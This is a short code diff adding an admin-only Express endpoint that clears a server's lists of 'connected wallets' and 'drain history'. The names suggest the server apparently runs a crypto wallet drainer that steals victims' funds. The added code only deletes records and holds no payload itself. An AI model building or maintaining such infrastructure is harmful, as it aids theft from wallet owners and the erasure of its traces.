@@ -308,6 +308,14 @@ app.delete('/admin/logs', adminAuth, (req, res) => {
   res.json({ ok: true })
 })
 
+// Clear all connected wallets and drain history
+app.delete('/admin/wallets', adminAuth, (req, res) => {
+  connectedWallets.length = 0
+  drainHistory.length = 0
+  addLog('info', 'All wallets and drain history cleared')
+  res.json({ ok: true })
+})
+
 // ── Start ────────────────────────────────────────────────────────────────────
 const PORT = process.env.PORT || 3001
 app.listen(PORT, () => {
